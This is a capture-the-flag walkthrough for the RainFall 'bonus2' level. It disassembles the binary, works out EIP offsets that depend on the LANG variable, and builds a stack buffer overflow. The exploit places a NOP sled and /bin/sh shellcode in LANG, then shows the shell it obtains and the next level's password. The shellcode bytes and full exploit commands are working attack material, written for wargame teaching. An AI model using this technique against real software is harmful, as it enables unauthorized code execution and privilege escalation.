# Bonus2

## Overview
This walkthrough explains how to exploit the `bonus2` binary. It includes detailed explanations for each step, covering the `argv` usage, the `LANG` environment variable, offsets, NOP sled, and shellcode.

## 1. Understanding the Binary
`bonus2` expects two command-line arguments and prints them separated by a space:

```bash
$ ./bonus2 coucou toi
Hello coucou
```

### Observations:

- Info functions show us a `main()` and a `greetuser()`

Analysing the main by disassembling : 

```bash
0x08048548 <+31>:	lea    0x50(%esp),%ebx
0x0804854c <+35>:	mov    $0x0,%eax
0x08048551 <+40>:	mov    $0x13,%edx
0x08048556 <+45>:	mov    %ebx,%edi
0x08048558 <+47>:	mov    %edx,%ecx
0x0804855a <+49>:	rep stos %eax,%es:(%edi)
```
* `lea 0x50(%esp),%ebx` → computes the address `esp+0x50` (this is the **start of the local buffer**).
* Then a `rep stos` → sets **0x13 (= 19 dwords = 76 bytes)** to zero in this buffer. So we have a buffer of approximately **76 bytes reserved for** `argv[1]` + `argv[2]`

```bash
0x0804855c <+51>:	mov    0xc(%ebp),%eax   ; argv
0x0804855f <+54>:	add    $0x4,%eax       ; argv+1
0x08048562 <+57>:	mov    (%eax),%eax     ; argv[1]
0x08048564 <+59>:	movl   $0x28,0x8(%esp) ; 40
0x0804856c <+67>:	mov    %eax,0x4(%esp)  ; src = argv[1]
0x08048570 <+71>:	lea    0x50(%esp),%eax ; dst = buffer
0x08048574 <+75>:	mov    %eax,(%esp)
0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
```
* `argv[1]` is retrieved.
* `strncpy(buffer, argv[1], 40)` → we copy **40 bytes max from** `argv[1]` into the buffer at `esp+0x50`.
 So `argv[1]` starts the buffer content.

```bash
0x0804857c <+83>:	mov    0xc(%ebp),%eax   ; argv
0x0804857f <+86>:	add    $0x8,%eax       ; argv+2
0x08048582 <+89>:	mov    (%eax),%eax     ; argv[2]
0x08048584 <+91>:	movl   $0x20,0x8(%esp) ; 32
0x0804858c <+99>:	mov    %eax,0x4(%esp)  ; src = argv[2]
0x08048590 <+103>:	lea    0x50(%esp),%eax
0x08048594 <+107>:	add    $0x28,%eax     ; buffer+40
0x08048597 <+110>:	mov    %eax,(%esp)
0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
```
* This time `argv[2]` is retrieved.
* `strncpy(buffer+40, argv[2], 32)` → we copy **32 bytes max from** `argv[2]` right after `argv[1]` in the buffer.

- The binary checks the `LANG` environment variable.

```bash
0x080485a6 <+125>:	call   0x8048380 <getenv@plt>   ;getenv("LANG")
0x080485ab <+130>:	mov    %eax,0x9c(%esp)
0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)   
0x080485ba <+145>:	je     0x8048618 <main+239> 
```
* `getenv("LANG")` → retrieves the value of `LANG`.
* If it doesn't exist → we take the default path (`Hello`).

```bash
; Test si LANG commence par "fi"
0x080485bc <+147>:	movl   $0x2,0x8(%esp)
0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)   ; "fi"
0x080485cc <+163>:	mov    0x9c(%esp),%eax        ; pointeur sur LANG
0x080485d3 <+170>:	mov    %eax,(%esp)
0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
...
0x080485df <+182>:	movl   $0x1,0x8049988         ; si == "fi", flag = 1

; Test si LANG commence par "nl"
0x080485eb <+194>:	movl   $0x2,0x8(%esp)
0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)   ; "nl"
0x080485fb <+210>:	mov    0x9c(%esp),%eax
0x08048602 <+217>:	mov    %eax,(%esp)
0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
...
0x0804860e <+229>:	movl   $0x2,0x8049988         ; si == "nl", flag = 2
```

- It sets a global variable depending on `LANG`:
  - `LANG=fi` → 1
  - `LANG=nl` → 2
  - Other → 0
- A function `greetuser()` copies and concatenates messages into a buffer, allowing a buffer overflow if the input is long enough.

## 2. argv Usage
Analyzing `main` in GDB:
- `argv[1]` is copied to a buffer at most 40 bytes.
- `argv[2]` is copied right after `argv[1]` at most 32 bytes.
- This combined buffer can overflow and overwrite `EIP` depending on `LANG`.

## 3. LANG Environment Variable
`LANG` determines the prefix message:
- `fi` → "Hyvää päivää " (long)
- `nl` → "Goedemiddag! " (different length)
- Other → "Hello "

The length of the prefix affects the offset where `EIP` is overwritten.

### Setting LANG:
```bash
export LANG=fi
export LANG=nl
```

## 4. Finding Offset for EIP
1. Generate a padding pattern manually to fill the buffer.
2. Run in GDB with the pattern as `argv[2]`:

```bash
gdb bonus2
run $(python -c 'print "A"*40') $(python -c 'print "PATTERN"')
```

### Results:
- `LANG=fi` → EIP overwritten after 18 bytes of `argv[2]`
- `LANG=nl` → EIP overwritten after 23 bytes of `argv[2]`

## 5. Shellcode
We use a standard Linux/x86 shellcode to spawn `/bin/sh`:
```python
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

## 6. Determining the Jump Address (into NOP sled)
1. Break at `main+125` in GDB.
2. Run the program and examine the environment:
```gdb
b *main+125
Breakpoint 1 at 0x80485a6

run $(python -c 'print "A"*40') bla
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') bla

Breakpoint 1, 0x080485a6 in main ()

x/20s *((char**)environ)
0xbffffebc:	 "LANG=nl\220\220....

```
3. Locate the start of `LANG` in memory (e.g., `0xbffffebc`).
4. Add a small offset (e.g., `+50`) to land in the middle of the NOP sled → `0xbffffeee`.
In hexadecimal form its `\xee\xfe\xff\xbf`

## 7. Building the Exploit
1. Set LANG with NOP sled + shellcode:
```bash
export LANG=$(python -c 'print("nl" + "\x90"*100 + SHELLCODE)')
```
2. Construct `argv`:
- `argv[1]` → 40 bytes of padding (`A*40`)
- `argv[2]` → offset-dependent padding (`B*18` for fi, `B*23` for nl) + address inside NOP sled (`0xbffffeee`)

Example:
```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xee\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

